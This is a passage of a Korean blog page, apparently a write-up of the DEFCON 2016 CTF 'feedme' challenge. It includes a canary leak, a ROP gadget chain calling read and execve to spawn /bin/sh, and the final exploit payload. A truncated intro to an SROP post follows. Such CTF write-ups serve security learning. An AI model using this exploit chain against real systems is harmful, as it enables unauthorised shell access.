class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA80lEQVQY04XPS26DMBQFUC+kGGw//8AmQCBEhSaG2PmpStPPrFL3v4wKtVKTSFGlM7i6enfw0Gb/NmzPq3By4dw++nD8cP7kwks4vHM9J3w2EQUVxW+eFAkYUCvUD76sW+9836+bfp3OKlPWpqypTDETMcgfGP5yDAozoHKBusETAp21C2trUIyKByoiIjCbju7QmHEqW9S5Mc3L1OYqy2qhU64xqOTu7HrswqFqe22riIgINAYd/2/6iMolcpuxahZN/5RwjhnFjN0CwAAxwEUJEY2JmCMfvvL82S4/pTly5bkON2S2U2avzO6i3IIalXn9BiUdR2W2npWVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./15.png\"\n        title=\"./15.png\"\n        src=\"/static/d77afbaa9bcff8755d7b40e8ba15e892/37523/15.png\"\n        srcset=\"/static/d77afbaa9bcff8755d7b40e8ba15e892/e9ff0/15.png 180w,\n/static/d77afbaa9bcff8755d7b40e8ba15e892/f21e7/15.png 360w,\n/static/d77afbaa9bcff8755d7b40e8ba15e892/37523/15.png 720w,\n/static/d77afbaa9bcff8755d7b40e8ba15e892/c946b/15.png 805w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>카나리 값 릭</p>\n<h2 id=\"rop-sceanario\" style=\"position:relative;\"><a href=\"#rop-sceanario\" aria-label=\"rop sceanario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP sceanario</h2>\n<ul>\n<li>NX 보호기법이 켜져 있기 때문에 메모리에서의 실행은 불가능하다 그렇기 때문에 ROP 해서 우회를 해야 하며 기본적으로 오버플로우를 발생 시켜 리턴 주소에 ROP 가젯을 집어넣어 EIP 조작을 진행해야 한다.</li>\n<li>라이브러리가 정적 링킹되어 있기 때문에 공유 라이브러리 상에서 필요한 함수를 가져올 수 가 없기 때문에 ROP를 바탕으로 SYS_CALL을 진행하여 exploit을 시도해야 한다.</li>\n</ul>\n<h2 id=\"rop시-필요한-sys_call\" style=\"position:relative;\"><a href=\"#rop%EC%8B%9C-%ED%95%84%EC%9A%94%ED%95%9C-sys_call\" aria-label=\"rop시 필요한 sys_call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP시 필요한 SYS_CALL</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACsElEQVQozzWLXUiTcRyFf9FFJBRvN3kV3RTRRaSYUbzYyixbZJlUdBFREZmR0V1QXUiRprSVizA/ynKZWm3O17BtTp2p/zbHlqy59sk+/NzmhMroj2kntuhcnefhHMrKkxWuzJKvw20iIqxYDZAWIMpAitN9I0CH8I9pAlQO0KUU/3cAyYEV2VIb0e639z+fMKrYKVPdSLHhEdvRqWS5mrvsyAcFO6qvZTs1FWm3W1vBig0qli/dY7naKpajrWF7u+6ykt4nLE93ZyRHq7BmdamfUr1rACYfw/uvw+jxDKF6zIR2/zD6QqMwBCzoCVtR5TBCH7bCGLRiIGJDo9uMR84+9Edt0Ps+YSBqQ6XDiK3a56CP05PL8/HkUnhqGsm5eaj9bkQXfiKZmMfE1Az4MvDS60IqwUgUy3wJtkQcUiQI/AbcgSDwB3gd9GDT24YZkjUqiy7oWuWXhvV5pZ96xWxNk3hAahFLmVEss5hEuaQWczqfiyU97eKV0X7xbH+XuE9qEXdon4lnTJ1iuX1QPG18J+7SNedt073YQFuOHSxec2DnfjpfkEk3i9ZmttULq1prBbpxTKAbxwVSK4T1HQ0CNd0R6HqhQIpyIaO1Vsh80ySQ8ppAV/MFqrslrO94uu7myCBRof7x9zLW/P3yUPOv8+Z6LutW8QKpmp8bqOMXzA38YHdV2h1+f59fHGziJw1Knt+t4DLpIS/RP+ClQ828uKfm1x6pdnG7ruUzGUIuBCJeOENueKNetAXG4ExGEY6F4ZnyY2ohjlc+O2YW4vBM+hH7NgvztA9dYRcSP2LpXzK18TuwRfMM9MLjXBwNBbk54OWWUJBXjll472SEW8Mh/jHg4/ZEjN9zMO5KzvE+71c+HpvlHUEPV7ns3JNIcP34F+5LJnmNc3Rp87vGkb8RH9JClSuOnAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./16.png\"\n        title=\"./16.png\"\n        src=\"/static/94e1e9d90ac26ed0c210754be0fae5f1/37523/16.png\"\n        srcset=\"/static/94e1e9d90ac26ed0c210754be0fae5f1/e9ff0/16.png 180w,\n/static/94e1e9d90ac26ed0c210754be0fae5f1/f21e7/16.png 360w,\n/static/94e1e9d90ac26ed0c210754be0fae5f1/37523/16.png 720w,\n/static/94e1e9d90ac26ed0c210754be0fae5f1/798d4/16.png 976w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>syscall</p>\n<ul>\n<li><code class=\"language-text\">/bin/sh</code> 문자열이 존재하지 않기 때문에 ROP를 바탕으로 read 함수로 입력을 받을 것이며 입력을 받게 되는데 NX 보호 기법을 우회하기 위해 <code class=\"language-text\">.bss</code> 섹션의 첫 번째 주소 부분에 데이터를 삽입할 것이다.</li>\n<li>마지막으로 execve syscall을 바탕으로 <code class=\"language-text\">.bss</code> 섹션에 존재하는 <code class=\"language-text\">/bin/sh</code> 문자열을 실행하게 된다면은 쉘을 딸 수 있겠다.</li>\n</ul>\n<h2 id=\"rop-code-gadget\" style=\"position:relative;\"><a href=\"#rop-code-gadget\" aria-label=\"rop code gadget permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP Code Gadget</h2>\n<ul>\n<li>ROPgadget 도구를 사용하여 필요한 Gadget을 찾아 보겠다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADH0lEQVQozzWOzWsjdRiAX9NdKqioXXF3W5Kmk8lMMjOZ+U0yme/MdzqZfKdtbENil5ZuWUVEPeh60IOKFz0p6P/gbaUnsSgomoNnr3sIIj1KtWDdnVcs+MDDc33ADuynAeD6dHT0/u5ohn2v+0fX2rzYCQcXPad9MbDji0Ej+TNyk9RrDrFuNlEgJvLERE7UUSAWlkX9SoavIyAivPn6W/DG5LU70+Hsl37N+2ZPi063at7p0IhP+1br244W/1QRnE8Zwdymy/rLOUqeZiky/b9ZikyyFNlbL1QnoDkGA889eePV6StfHu4eYLfu4kgPsWWE6NZd9Csa+pKJIm+9XauFIGox8EoIHHFBlhyQRQfWNgisrXOQpUQAzTWfAQDoD44Pt3aOvu92Zg+iaHwSx3sn0ebuSbM1edAdHJy2+3ffdcOpYkVTzxscO2683+g2Z04v3ncorr1ycxmALpnX4Ouv3oPRSwnsTI7faQ+2/9Gd6Lcg7p1Z3uaZ7oRngROe2Zb3e930zlXLR0OzHzuK8ViQ6o9EjjwSyyTNsbafZUygS1YGZneSpe3dFownR58kvQFWdRvdqIW230TP8bGpmSgrOhLVQKmmYlWQUKZZ5AsMrlE0Zgss0qzVLLA6UIyWgUbUWEb8C0bje/e6w+mvphr86OvRXG0kc0ML55Zsz8sVY84Tey5WnXmZ2HOBV3+WeXVOsfIPG0X5O7ocyHTJA7rkZkBzjZXbdO7F3tbR/SjZOlc0/6HjJguemIsyMReK6i2CeLSwvPaC4esLTjIWZVF/yAjqOSf6H+SZ61DV/Mzt9WcBlgHg8KDzRNwLIe5MPtYtF4tlCS03QkW3UZAU5CtVNBsBelGCPFEwS7GYK/wng3mafHErdwNeWIUlUrsPVwxd+9peEEDfHX/YsRPUOe3vQPFTW7RSg9dTRzDSZtVNdbmRbpRIulEU03yxcpkvVpBitc9W88/Dan5lSZDuAst1AeKOvdQeBBC1xh+FcYIFlr+0vQhV00GiaCiIVVSNBjbbfazpFrKChOs0e3l1WCSf38o9BTezyxlO3L86/BeJ7xtkOWSA0QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./17.png\"\n        title=\"./17.png\"\n        src=\"/static/4edd80109d311430c02adc4c701b327d/37523/17.png\"\n        srcset=\"/static/4edd80109d311430c02adc4c701b327d/e9ff0/17.png 180w,\n/static/4edd80109d311430c02adc4c701b327d/f21e7/17.png 360w,\n/static/4edd80109d311430c02adc4c701b327d/37523/17.png 720w,\n/static/4edd80109d311430c02adc4c701b327d/302a4/17.png 1080w,\n/static/4edd80109d311430c02adc4c701b327d/48ca3/17.png 1084w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ROP Gadget</p>\n<h2 id=\"rop\" style=\"position:relative;\"><a href=\"#rop\" aria-label=\"rop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">,</span> <span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh\\x00<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n\n<span class=\"token function\">execve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\">#ROP</span>\npppr <span class=\"token operator\">=</span> <span class=\"token number\">0x806f370</span>\npeax <span class=\"token operator\">=</span> <span class=\"token number\">0x80bb496</span>\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x806fa20</span>\n    \n<span class=\"token comment\"># read</span>\nrop <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>peax<span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x3</span><span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>pppr<span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> \nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># execve    </span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>peax<span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>pppr<span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"exploit\" style=\"position:relative;\"><a href=\"#exploit\" aria-label=\"exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">payload <span class=\"token operator\">=</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0xC</span> <span class=\"token operator\">+</span> rop\n    \np<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXUlEQVQoz23QX0hTcRQH8F/P9aDQm7i7+//eebc53dT9cas1lxuWD2blNG9IReCDRdFTEWUZrS3J6CUI9CHywaYJ9eBk6kwTWxrZMjYNYzfUoCRhWbu5E5spGT18OIfz8OWcg3YfcWuah57Oe8MhaB0JQl3wyd0Lg10oBN/Q/gMNnsrq+uP2Kk9jRVWd6HQfFh2uWlFnsIvFZQ6RE4yiktKJOFMk4vQGhIZu7Jp4E/0EsxJAfBHaJ0MDNaO+5sYHV72lVidYzDawW/aC3mACTXEZcOoiwJkCIFgBlLQKMIrfBqGWQ7md8bfSwuISvF/+DC3jvbETI3eiTT3eWLHZvipoCtd5lpUZgpbzcErOJ2hZQbJyPsFk678QOleb0xWbkaSFBMQ+SnD2Rf90Q+hWoOmxf9DqPPjdYLKCkhXSeQSTxiguS0FyaSXF/+nZrXkGQn2tOcMTEQnGovDrZQxujj177Rn2B0/3tY87XNVJQasHXqtPMwUawCgOFCSbRTAqUNJ8ts/MNyF070zOw1eTUuLdHMzNzsP5cO/UsXB7Z9OjtoDZVpE0Wu1gsu1Ll5ptQHEC5BPMVuhm2N+hCJ2qyu2X5qVkKgVffv6Ai5GB0Zrg9fv13dd6LPbKVbXOsC7oSlIUr5ZJVpBxRiWT3EbN/AyjuG0Quly3M/J1WYKVJMDaOvhnhqePDnpDJwO+SLnDBQXaItDqy4Dm1UCr1EByQhbOZM7dvm0G2uEuL+n+MJtYWktCfHUFrkw97wIAdKmjA7PuqW7j1MbbQqHFh5Fan4LU+jCqMEtJ63z4f/wGct1LIw4Q6ToAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./18.png\"\n        title=\"./18.png\"\n        src=\"/static/44e151bc7a69f5e6afa00e029e6e3a0f/37523/18.png\"\n        srcset=\"/static/44e151bc7a69f5e6afa00e029e6e3a0f/e9ff0/18.png 180w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/f21e7/18.png 360w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/37523/18.png 720w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/302a4/18.png 1080w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/07a9c/18.png 1440w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/c4451/18.png 1450w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Exploit memory</p>\n<ul>\n<li>ROP 를 바탕으로 쉘 권한을 획득할 수 있는 것을 확인할 수 있다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\">보호기법</a></li>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\">바이너리 분석</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#sub_80490b0-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_80490B0 함수 분석</a></li>\n<li><a href=\"#sub_804f700-feedme-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_804F700 [feedme] 함수 분석</a></li>\n<li><a href=\"#sub_8048e42-read_byte-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_8048E42 [read_byte] 함수 분석</a></li>\n<li><a href=\"#sub_8048e7e-next_read-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_8048E7E [next_read] 함수 분석</a></li>\n<li><a href=\"#canary-%EB%B6%84%EC%84%9D\">canary 분석</a></li>\n<li><a href=\"#fork-%EB%B6%84%EC%84%9D\">fork 분석</a></li>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9\">공격</a></li>\n<li><a href=\"#canary-brute-force\">canary brute-force</a></li>\n<li><a href=\"#rop-sceanario\">ROP sceanario</a></li>\n<li><a href=\"#rop%EC%8B%9C-%ED%95%84%EC%9A%94%ED%95%9C-sys_call\">ROP시 필요한 SYS_CALL</a></li>\n<li><a href=\"#rop-code-gadget\">ROP Code Gadget</a></li>\n<li><a href=\"#rop\">ROP</a></li>\n<li><a href=\"#exploit\">Exploit</a></li>\n</ul>\n</div>","excerpt":"취약점 분석 바이너리 개요  보호 기법 stripped statically linked 32 bit 보호기법 No RELRO Canary found NX enabled PIE disabled 바이너리 분석  로직 분석1  바이너리의 입력 값으로  를  입력한 결과 SSP가 켜지는 것을 확인할 수 있으며 해당 바이너리에는 카나리가 존재하는 것을 확인할 수 있다.  로직 분석2 하지만  바이너리의 입력 값으로 를  번 입력한 결과 SSP 켜지지 않는 것으로 보아 앞의 첫 바이트의 입력 값이 해당 다음 입력 값 즉, 문자열의 길이 값이 되는 것을 추측할 수 있다.  systemcall system 호출 범위를 분석하던 중  시그널을 보낸 후  함수를 바탕으로  출력을 하는 것을 확인할 수 있으며 다시 자식 프로세스를 생성하는 것을 확인할 수 있다. 이로 인해 해당 바이너리는  함수를 바탕으로 자식 프로세스를 생성하는 로직을 확인할 수 있다. main 함수 분석  main 함수 분석 ma…","frontmatter":{"date":"September 18, 2020","title":"DEFCON 2016 feedme 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🐷"},"fields":{"slug":"/defcon2016_feedme_ctf_writeup/"}},"next":{"id":"cbffc1ab-7686-56fd-8fa1-eb66d7c1de19","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<blockquote>\n<p>SROP</p>\n<ul>\n<li>\n<p>리눅스에서는 시그널이 들어오게 되면 커널 모드에서 처리한다.</p>\n</li>\n<li>\n<p>커널 모드에서 유저모드로 들어오는 과정에서 유저의 스택에 레지스터 정보들을 저장해 놓는다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 은 이렇게 저장해놓은 정보들을 다시 돌려놓을 때 사용된다.</p>\n</li>\n<li>\n<p>공격자가 <code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 호출할 수 있고 스택을 조작할 수 있다면 모든 레지스터와 > 세그먼트를 조작할 수 있다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 사용하여 익스폴로잇 하는 기법을 SigReturn Oriented Programming > (SROP)라고 한다.</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"restore_sigcontext\" style=\"position:relative;\"><a href=\"#restore_sigcontext\" aria-label=\"restore_sigcontext permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>restore_sigcontext</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">restore_sigcontext</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pt_regs</span> <span class=\"token operator\">*</span>regs<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span> __user <span class=\"token operator\">*</span>sc<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> uc_flags<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> buf_val<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> __user <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> tmpflags<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> err <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* Always make any pending restarted system calls return -EINTR */</span>\n\tcurrent<span class=\"token operator\">-></span>restart_block<span class=\"token punctuation\">.</span>fn <span class=\"token operator\">=</span> do_no_restart_syscall<span class=\"token punctuation\">;</span>\n\tget_user_try <span class=\"token punctuation\">{</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_32</span></span>\n\t\t<span class=\"token function\">set_user_gs</span><span class=\"token punctuation\">(</span>regs<span class=\"token punctuation\">,</span> <span class=\"token function\">GET_SEG</span><span class=\"token punctuation\">(</span>gs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token 